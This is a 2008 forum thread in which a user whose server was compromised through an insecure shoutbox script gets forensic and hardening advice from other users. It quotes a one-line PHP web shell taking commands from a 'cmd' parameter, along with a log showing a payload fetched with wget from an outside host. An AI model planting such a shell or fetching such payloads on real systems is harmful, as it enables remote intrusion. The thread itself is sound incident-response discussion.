---
title: "i *have* been hacked."
date: 2008-02-05
forum: Server Platforms
---

### Post by dmizer on 2008-02-05
i am not sure what happened, but my server was hacked, dyndns account compromised, and my domains stolen.

i found this in my apache logs (japan time):
```
[Wed Feb 06 09:28:34 2008] [error] [client 66.249.65.19] File does not exist: /var/www/forum/Themes/pnpn111
--12:07:31--  http://la.gg/upl/vf.txt
           => `vf.txt'
Resolving la.gg... 75.126.53.24
Connecting to la.gg|75.126.53.24|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 72,989 (71K) [text/plain]

    0K .......... .......... .......... .......... .......... 70%   49.51 KB/s
   50K .......... .......... .                               100%  496.07 KB/s

12:07:40 (67.70 KB/s) - `vf.txt' saved [72989/72989]
```

i had a fully updated simple machines forum on my server with thepnpn111 theme mentioned in the log.  i cannot find a "vf.txt" or "vf.*" on my system at all.

i also had a java based shout script running in which the following code was injected:
```
<?php system($_GET["cmd"]); ?>
```

for which i'm sure they used to get my system information.  where else should i look for information?

the server has been taken offline until i can figure out what happened and figure out how i can prevent it in the future.

---

### Post by gaten on 2008-02-06
First off, it's great you've taken the system off line, but plan on formating the whole thing and starting over. 
You should check out *all* the logs in your system, not just your apache ones. auth, syslog especially, just checking for various out of place events.

Find a forensic toolkit for linux (I believe Ubuntu has a link to one somewhere in the security sticky), image your hard drive and store it somewhere for analysis.

---

### Post by dmizer on 2008-02-06
yes, i was planning to reinstall, and since i have backups there's not really going to be any data loss.

my issue here is that i had a fairly basic setup that was compromized somehow.  the tipoff was that i received an email from dyndns that indicated a password change request (click on this link to change the password), and a subsequent email which indicated my password had been changed.

i shutdown my server, went to dyndns, and could not log in without doing another password change request.  my dynamic domains were removed from my account.  to their credit, i sent a support email to dyndns, and they reinstated my domains quite quickly.

anyway, for obvious reasons, i'd like to prevent this from happening in the future.  i tried to do everything right ... no ftp server, i had encrypted key based authentication for ssh, and my router only forwarded port 80 and ssh (NOT 22) to my server.

edit:
before shutdown, i checked auth.log, and the only authentications showing in the log were myself and chron.

---

### Post by gaten on 2008-02-06
That question is really only going to be answered by extensive log analysis. Check out some forensic tools and what not, scanning through the logs won't do it I think.

If you only had 2 ports open, was apache patched and updated? Was it running in a chroot jail and did you install something like mod_secuirty? It looks like someone got in through your applet or some kind of injection, did you have MySQL up and running? 

The web will always be your biggest attack vector, and pains should be taken to secure it as much as possible.

Try LightTPD next time, less of a target than Apache and less exploits to date.

---

### Post by soulresin on 2008-02-06
> **dmizer said:**
> 

... some stuff snipped ...
anyway, for obvious reasons, i'd like to prevent this from happening in the future.  i tried to do everything right ... no ftp server, i had encrypted key based authentication for ssh, and my router only forwarded port 80 and ssh (NOT 22) to my server.



Just out of curiosity (I see this stuff almost every day where I work), was/is allow_url_fopen set to On in /etc/php.ini?

Thanks.

---

### Post by dmizer on 2008-02-06
actually, it was really quite a simple attack.

the php script i was using for my shoutbox was saving its post data in a chmod 777 php file.  so all they had to do was post the above php command, and browse to the data.php file for the code to execute.  my fault for not making sure permissions were set properly, as well as for not reviewing poorly implemented code more carefully before sending it live.

also ... my apache was not configured to run in a chroot environment, and a few other rookie mistakes on my part made the whole thing trivial.

don't know specifically about the "allow_url_fopen" option, but i will check when i get home from work this evening.

---

### Post by soulresin on 2008-02-06
> **dmizer said:**
> actually, it was really quite a simple attack.

the php script i was using for my shoutbox was saving its post data in a chmod 777 php file.  so all they had to do was post the above php command, and browse to the data.php file for the code to execute.  my fault for not making sure permissions were set properly, as well as for not reviewing poorly implemented code more carefully before sending it live.

also ... my apache was not configured to run in a chroot environment, and a few other rookie mistakes on my part made the whole thing trivial.

don't know specifically about the "allow_url_fopen" option, but i will check when i get home from work this evening.

777 permissions.  Lesson learned.  It happens more than you'd think. :)

Like I said, I see that kind of stuff every day, and a good chunk of the time it's due to allow_url_fopen being set to On, and some shoddy PHP code; hence my curiosity and question.

You're not likely to find the vf.txt as most of the time the exploit scripts clean up the files after themselves.  Since the time of the wget is in the error_log, you could check for POST in the access_log around that time.  Could give you an indicator of what part of your web site may have been hit, and where files were dumped (altho, seems like you've already got a handle on that).

I looked at the vf.txt from [http://la.gg/upl/vf.txt](http://la.gg/upl/vf.txt).  Looks to be a pretty simple webadmin script/shell written in PHP.

Good luck with your investigation. :)

---

### Post by michaelzap on 2008-02-06
Sounds like a vulnerability in your shoutbox script alright. I would make sure that it's patched and secure before you use it again. I imagine that the hacker just passed various commands through the query string cmd variable once they could execute them via data.php, so they wouldn't have needed to write a file with that code to your server in any case (they could've executed it remotely or just passed it bit by bit in the query string).

---

### Post by dmizer on 2008-02-06
actually, i have ditched the shoutbox script completely.  don't think i'll implement another one, as my site's not really a "community based" endeavor anyway.  i just put it in place for the learning experience.  guess i got much more of a lesson than i bargained for.

---

### Post by dmizer on 2008-02-07
here's a link to the script if anyone is interested in reviewing it: [http://www.shoutpro.com/index.php](http://www.shoutpro.com/index.php)

interestingly enough, the site's news indicates that his site was hacked as well.

---

### Post by michaelzap on 2008-02-07
The script's author didn't properly sanitize user input, which means that anyone can execute arbitrary PHP code via that script:

[http://www.securityfocus.com/archive/1/466037](http://www.securityfocus.com/archive/1/466037)

A simple strip_tags() would've fixed it, and 777 permissions are never a good idea either.

---

### Post by dmizer on 2008-02-07
> **michaelzap said:**
> The script's author didn't properly sanitize user input, which means that anyone can execute arbitrary PHP code via that script:

[http://www.securityfocus.com/archive/1/466037](http://www.securityfocus.com/archive/1/466037)

A simple strip_tags() would've fixed it, and 777 permissions are never a good idea either.

oh nice, i landed on a script with a gaping hole, and a security bug that's been open since April 2007.  figures.

> **gaten said:**
> ... clipped ...

Was it [apache] running in a chroot jail and did you install something like mod_secuirty?

okay, i found a great tutorial in the ubuntu wiki which made chrooting apache trivial: [https://wiki.ubuntu.com/ModChroot](https://wiki.ubuntu.com/ModChroot)

now my problem is how to get associated needs met within the chroot environment.  for example, the primary focus of my site is my gallery.  in order for gallery to function correctly, it requires imagemagick.

i've read some guides (mostly for openBSD), but i can't seem to get it all working correctly.

---

